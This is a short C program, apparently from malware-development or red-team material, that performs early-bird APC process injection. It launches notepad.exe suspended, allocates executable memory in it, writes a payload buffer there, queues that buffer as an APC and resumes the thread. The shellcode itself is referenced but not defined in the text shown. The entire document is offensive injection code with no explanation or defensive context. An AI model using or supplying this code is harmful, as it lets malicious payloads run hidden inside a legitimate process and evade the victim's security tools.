int main(void) {
    int pid = 0;
    HANDLE hProc = NULL;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    void *pRemoteCode;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);

    ResumeThread(pi.hThread);

    return 0;
}
